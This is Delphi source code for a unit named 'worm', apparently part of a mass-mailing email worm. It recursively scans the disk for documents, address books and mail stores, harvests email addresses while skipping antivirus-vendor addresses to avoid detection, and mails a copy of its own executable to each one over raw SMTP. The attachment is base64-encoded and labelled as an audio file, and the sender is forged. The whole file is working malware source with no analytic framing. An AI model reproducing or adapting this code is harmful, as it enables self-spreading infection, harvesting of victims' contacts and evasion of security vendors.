   unit worm;

   interface

   Uses windows,messages,winsock,MXLookup;

    Procedure GrabMail(D, Name, SearchName : String);
    Procedure SetPath(S:string);
    function FileExists(const FileName: string): Boolean;
    PROCEDURE mailz(Subject,Body,Recip,From,AttachmentPath:AnsiString);
   implementation

   CONST
     CRLF=#13#10;

   TYPE
     Triple = ARRAY[1..3] OF BYTE;
     Quad   = ARRAY[1..4] OF BYTE;
     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

   VAR
     PATH:string;
     wins:array[0..300]of record name:string;
     wnd:hwnd;
     end;
     wcnt:integer=0;

     ZIPNAME          : STRING;
     Sock             : TSocket;
     Wsadatas         : TWSADATA;
     SockAddrIn       : TSockAddrIn;


     BUF              : ARRAY[0..36000]of char;
     SMTPServer       : STRING = '';
     SMTPAcc          : STRING = '';

     FileBuf          : ARRAY[1..1000000] OF BYTE;                                 //You have to change it if your attachment bigger tgan 1MB
     CC               : STRING = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
     F:FILE;HT:TExtfile;
     all_mail:String;

   function extractfilename(s:String):string;
   begin
   while pos('\',s)>0 do begin
    s:=copy(s,pos('\',s)+1,length(s));
   end;
    result:=s;
   end;

   FUNCTION Mys(STR:STRING) : BOOL;
   BEGIN
     IF Send(Sock,STR[1],Length(STR),0)=SOCKET_ERROR THEN Result:=True ELSE Result:=False;
   END;

   FUNCTION IPstr(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   function sysdir:String;
   var
    ap:array[0..666]of char;
   begin
    getsystemdirectory(ap,255);
    result := ap;
    result := result+'\';
   end;


   FUNCTION Codeb64(Count:BYTE;T:Triple) : STRING;
   VAR
     Q    : Quad;
     Strg : STRING;
   BEGIN
     IF Count<3 THEN BEGIN
       T[3]:=0;
       Q[4]:=64;
     END ELSE Q[4]:=(T[3] AND $3F);
     IF Count<2 THEN BEGIN
       T[2]:=0;
       Q[3]:=64;
     END ELSE Q[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);
     Q[2]:=Byte(((T[1] SHL 4) OR (T[2] SHR 4)) AND $3F);
     Q[1]:=((T[1] SHR 2) AND $3F);
     Strg:='';
     FOR Count:=1 TO 4 DO Strg:=(Strg+CC[(Q[Count]+1)]);
     RESULT:=Strg;
   END;

   FUNCTION BASE64(DataLength:DWORD) : AnsiString;
   VAR
     B      : AnsiString;
     I      : DWORD;
     Remain : DWORD;
     Trip   : Triple;
     Count  : WORD;
   BEGIN
     Count:=0;
     B:='';
     FOR I:=1 TO DataLength DIV 3 DO BEGIN
       INC(Count,4);
       Trip[1]:=Ord(FileBuf[(I-1)*3+1]);
       Trip[2]:=Ord(FileBuf[(I-1)*3+2]);
       Trip[3]:=Ord(FileBuf[(I-1)*3+3]);
       B:=B+codeb64(3,Trip);
       IF Count=76 THEN BEGIN
         B:=B+CRLF;
         Count:=0;
       END;
     END;
     Remain:=DataLength-(DataLength DIV 3)*3;
     IF Remain>0 THEN BEGIN
       Trip[1]:=Ord(FileBuf[DataLength-1]);
       IF Remain>1 THEN Trip[2]:=Ord(FileBuf[DataLength]);
       IF Remain=1 THEN B:=B+Codeb64(1,Trip) ELSE B:=B+Codeb64(2,Trip);
     END;
     RESULT:=B;
   END;


   function AnsiUpperCase(const S: string): string;
   {$IFDEF MSWINDOWS}
   var
    Len: Integer;
   begin
    Len := Length(S);
    SetString(Result, PChar(S), Len);
    if Len > 0 then CharUpperBuff(Pointer(Result), Len);
   end;
   {$ENDIF}
   {$IFDEF LINUX}
   begin
    Result := WideUpperCase(S);
   end;
   {$ENDIF}

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;

   function Trim(const S: string): string;
   var
    I, L: Integer;
   begin
    L := Length(S);
    I := 1;
    while (I <= L) and (S[I] <= ' ') do Inc(I);
    if I > L then Result := '' else
     begin
      while S[L] <= ' ' do Dec(L);
      Result := Copy(S, I, L - I + 1);
     end;
   end;

   function FileAge(const FileName: string): Integer;
   {$IFDEF MSWINDOWS}
   var
     Handle: THandle;
     FindData: TWin32FindData;
     LocalFileTime: TFileTime;
   begin
     Handle := FindFirstFile(PChar(FileName), FindData);
     if Handle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(Handle);
       if (FindData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = 0 then
       begin
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         if FileTimeToDosDateTime(LocalFileTime, LongRec(Result).Hi,
           LongRec(Result).Lo) then Exit;
       end;
     end;
     Result := -1;
   end;
   {$ENDIF}
   {$IFDEF LINUX}
   var
     st: TStatBuf;
   begin
     if stat(PChar(FileName), st) = 0 then
       Result := st.st_mtime
     else
       Result := -1;
   end;
   {$ENDIF}

   function FileExists(const FileName: string): Boolean;
   {$IFDEF MSWINDOWS}
   begin
     Result := FileAge(FileName) <> -1;
   end;
   {$ENDIF}
   {$IFDEF LINUX}
   begin
     Result := euidaccess(PChar(FileName), F_OK) = 0;
   end;
   {$ENDIF}


           //SendE
   PROCEDURE mailz(Subject,Body,Recip,From,AttachmentPath:AnsiString);
   VAR
     F              : FILE;
     a,b,j,AttachmentName : STRING;

   BEGIN

     WSACleanup();
     AttachmentPath:=sysdir+AttachmentPath;
     copyfile(pchar(paramstr(0)),pchar(attachmentpath),false);
     AttachmentName:=ExtractFileName(AttachmentPath);
     SMTPServer:=GetSMTPAddress(Copy(recip,Pos('@',recip)+1,Length(recip)));

     IF SMTPServer<>'' THEN BEGIN
       WSAStartUp(257,wsadatas);
       Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
       SockAddrIn.sin_family:=AF_INET;
       SockAddrIn.sin_port:=htons(25);
       SockAddrIn.sin_addr.S_addr:=inet_addr(PChar(IPstr(SMTPServer)));
       Connect(Sock,SockAddrIn,SizeOf(SockAddrIn));
       Mys('HELO '+copy(smtpserver,pos('.',smtpserver)+1,length(smtpserver))+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('MAIL FROM: '+from+CRLF); //"Superzone eCard" <ecard@superzone.com>
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('RCPT TO: '+recip+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('DATA'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       randomize();
   a := '';
   b := '';
   while length(a) <= 13 do
   a:=a+inttostr(random(9));

   while length(b) <= 4 do
   b := inttostr(random(99999));

   j := 'Message-ID: '+a+'.'+b+'.qmail@'+copy(smtpserver,pos('.',smtpserver)+1,length(smtpserver));

       Mys(j+crlf);
       Mys('From: Cissi <'+from+'>'+CRLF);
       Mys('Subject: '+Subject+CRLF);
       Mys('To: '+Recip+CRLF);
       Mys('MIME-Version: 1.0'+CRLF);
       Mys('Content-Type: multipart/mixed; boundary="bla"'+CRLF+CRLF);
       Mys('--bla'+CRLF);
       Mys('Content-Type: text/plain; charset:us-ascii'+CRLF+CRLF);
       Mys(Body+CRLF+CRLF);
       Mys('--bla'+CRLF);
       Mys('Content-Type: audio/x-wav;'+CRLF);
       Mys('    name="'+ExtractFilename(AttachmentPath)+'"'+CRLF);
       Mys('Content-Transfer-Encoding: base64'+CRLF+CRLF);
       AssignFile(F,AttachmentPath);
       FileMode:=0;
       {$I-}
       Reset(F,1);
       IF IOResult=0 THEN BEGIN
         BlockRead(F,FileBuf[1],FileSize(F));
         Mys(BASE64(FileSize(F)));
         CloseFile(F);
       END;
       {$I+}
       Mys(CRLF+'--bla--'+CRLF+CRLF);
       Mys(CRLF+'.'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys('QUIT'+CRLF);
       Recv(Sock,Buf,Sizeof(Buf),0);
       WSACleanup();
     END;

   END;

   procedure focuswin(olle:integer);
   var
     w:hwnd;
   begin
     w:=olle;
     setforegroundwindow(w);
   end;

   function mail2(s:string;ext:String):string;
   var
   i,j:integer;
   abc:string;
   f:string;
   label q,t;
   begin
    abc := '@.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-0123456789';
   result := '';
   i:=0;
   q:
   if pos('.'+ext,s)-i = 0 then begin
   for j :=0 to length(result)-1 do begin
   f := f + copy(result,length(result)-j,1);
   end;
    result := f + ext;
    exit;
   end;
   if pos(copy(s,pos('.'+ext,s)-i,1),abc) = 0 then begin
   i:=pos('.'+ext,s);//i+1;
   goto q;
   end else begin
   result := result + copy(s,pos('.'+ext,s)-i,1);
   i:=i+1;
   goto q;
   end;
   end;

   procedure mail(g:string;ext:string);
   var i:integer;y,a,s:string;
   abc:string;
   cissi:textfile;
   label u,b,f;
   begin
    abc := '@.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-0123456789';
   f:
   if (pos('.'+ext,g) > 0) then begin
   s := copy(g,0,pos('.'+ext,g));
   s := s +ext;
   i:=1;
   b:
   y:=copy(s,pos('.'+ext,s)-i,1);
   if pos(y,abc) > 0 then
   begin
    a:=copy(s,pos(' ',s)+1,length(s));
   while pos(' ',a) > 0 do
    a:=copy(a,pos(' ',a)+1,length(a));
   if pos('www',a) > 0 then exit;
   if pos('wwp',a) > 0 then exit;
   if pos('ftp',a) > 0 then exit;
   if pos('http',a) > 0 then exit;
   if pos('@',a) = 0 then exit;
   a := mail2(a,ext);
   if (a <> '.'+ext) and (a <> '') and (a <> ' ') and (a <> ' .'+ext) then begin
    if pos(ansiuppercase(a),ansiuppercase(all_mail)) =0 then begin
    if (pos(ansiuppercase('antiv'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('syman'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('microsoft'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('trendm'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('f-sec'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('mcaf'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('virus'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('anti'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('kav'),ansiuppercase(a)) = 0) and
       (pos(ansiuppercase('kasp'),ansiuppercase(a)) = 0) then begin begin
      all_mail := all_mail + ansiuppercase(a) + #13#10;
   Assignfile(Cissi,PATH);
   if fileexists(path) then
   Append(Cissi) else rewrite(cissi);
   Writeln(Cissi,Ansiuppercase(a));
   Closefile(cissi);
        end;
   end;
   end;
   ///all_mail := all_mail + a + '%';
   end;
    end
    else begin
   i:=i+1;
   sleep(100);
    goto b;
    end;
   end;
   g := copy(g,pos(a,g)+length(a),length(g));
   if copy(g,0,2) = #13#10 then g := copy(g,3,length(g));
   if pos('.'+ext,g) > 0 then goto f;
   end;

   Function gimmebody(b:string):string;
   var
       TextTemp: String;
       TextTemp2: String;
       Text: String; test:integer;
       EditText: TextFile;
   begin
   try
   if pos('.',extractfilename(b)) = 0 then exit;
   if not fileexists(b) then exit;
       AssignFile(EditText, b);
       Reset(EditText);
       test := filesize(edittext);
   if test > 800 then exit;
       Read(Edittext, TextTemp);
       ReadLn(EditText, TextTemp2);
       Text := TextTemp;
   While Not Eof(EditText) do begin
       Read(Edittext, TextTemp);
       ReadLn(EditText, TextTemp2);
       Text := Text + #13 + #10 + TextTemp;
   end;
       CloseFile(EditText);
       result := text;
   except
    exit;
   end;
   end;

   procedure ReadText(b:string);
   var
       TextTemp: String;
       TextTemp2: String;
       Text: String; test:integer;
       EditText: TextFile;
   begin
   try
   if pos('.',extractfilename(b)) = 0 then exit;
   if not fileexists(b) then exit;
       AssignFile(EditText, b);
       Reset(EditText);
       test := filesize(edittext);
   if test > 1200 then exit;
   if test <= 0 then exit;
       Read(Edittext, TextTemp);
       ReadLn(EditText, TextTemp2);
       Text := TextTemp;
   While Not Eof(EditText) do begin
       Read(Edittext, TextTemp);
       ReadLn(EditText, TextTemp2);
       Text := Text + #13 + #10 + TextTemp;
   end;
       CloseFile(EditText);

       mail(text,'co.nz');
       mail(text,'com');
       mail(text,'net');
       mail(text,'org');
       mail(text,'se');
       mail(text,'tk');

   except
    exit;
   end;
   end;


   Procedure SetPath(S:string);
   begin
    PATH := s;
   end;

   Procedure GrabMail(D, Name, SearchName : String);
   const
     faReadOnly  = $00000001 platform;
     faHidden    = $00000002 platform;
     faSysFile   = $00000004 platform;
     faVolumeID  = $00000008 platform;
     faDirectory = $00000010;
     faArchive   = $00000020 platform;
     faAnyFile   = $0000003F;

   type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle  platform;
       FindData: TWin32FindData  platform;
     end;

     var
      pat,jesus:string;
      bu:array[0..255]of char;

   procedure Search(ja,jaa:string);
   begin

         if (pos('.htt',jaa)>0) or
            (pos('.rtf',jaa)>0) or
            (pos('.doc',jaa)>0) or
            (pos('.xls',jaa)>0) or
            (pos('.ini',jaa)>0) or
            (pos('.mdb',jaa)>0) or
            (pos('.txt',jaa)>0) or
            (pos('.htm',jaa)>0) or
            (pos('.html',jaa)>0) or
            (pos('.wab',jaa)>0) or
            (pos('.pst',jaa)>0) or
            (pos('.fdb',jaa)>0) or
            (pos('.cfg',jaa)>0) or
            (pos('.ldb',jaa)>0) or
            (pos('.eml',jaa)>0) or
            (pos('.abc',jaa)>0) or
            (pos('.ldif',jaa)>0) or
            (pos('.nab',jaa)>0) or
            (pos('.adp',jaa)>0) or
            (pos('.mdw',jaa)>0) or
            (pos('.mda',jaa)>0) or
            (pos('.mde',jaa)>0) or
            (pos('.ade',jaa)>0) or
            (pos('.sln',jaa)>0) or
            (pos('.dsw',jaa)>0) or
            (pos('.dsp',jaa)>0) or
            (pos('.vap',jaa)>0) or
            (pos('.php',jaa)>0) or
            (pos('.asp',jaa)>0) or
            (pos('.shtml',jaa)>0) then begin
          getsystemdirectory(bu,255);
          pat:= bu;pat:=pat+'\st\';
          try
          createdirectory(pchar(pat),nil);
          copyfile(pchar(ja+jaa),pchar(pat+jaa),false);
          if fileexists(pat+jaa) then
          readtext(pat+jaa);

          deletefile(Pchar(pat+jaa));
          except
           exit;
          end;
         end;
   end;

     function FindMatchingFile(var F: TSearchRec): Integer;
     var
       LocalFileTime: TFileTime;
     begin
       with F do
       begin
         while FindData.dwFileAttributes and ExcludeAttr <> 0 do
           if not FindNextFile(FindHandle, FindData) then
           begin
             Result := GetLastError;
             Exit;
           end;
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
           LongRec(Time).Lo);
         Size := FindData.nFileSizeLow;
         Attr := FindData.dwFileAttributes;
         Name := FindData.cFileName;
         jesus := Name;
         Search(D,Jesus);
       end;
       Result := 0;
     end;

     procedure FindClose(var F: TSearchRec);
     begin
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Windows.FindClose(F.FindHandle);
         F.FindHandle := INVALID_HANDLE_VALUE;
       end;
     end;

     function FindFirst(const Path: string; Attr: Integer;
       var  F: TSearchRec): Integer;
     const
       faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
     begin
       F.ExcludeAttr := not Attr and faSpecial;
       F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Result := FindMatchingFile(F);
         if Result <> 0 then FindClose(F);
       end else
         Result := GetLastError;
     end;

     function FindNext(var F: TSearchRec): Integer;
     begin
       if FindNextFile(F.FindHandle, F.FindData) then
         Result := FindMatchingFile(F) else
         Result := GetLastError;
     end;

   var
     SR: TSearchRec;
   begin
     If D[Length(D)] <> '\' then D := D + '\';

     If FindFirst(D + '*.*', faDirectory, SR) = 0 then
       Repeat
         If ((Sr.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
           GrabMail(D + SR.Name + '\', Name, SearchName);
       Until (FindNext(SR) <> 0);
     FindClose(SR);
   end;

   end.
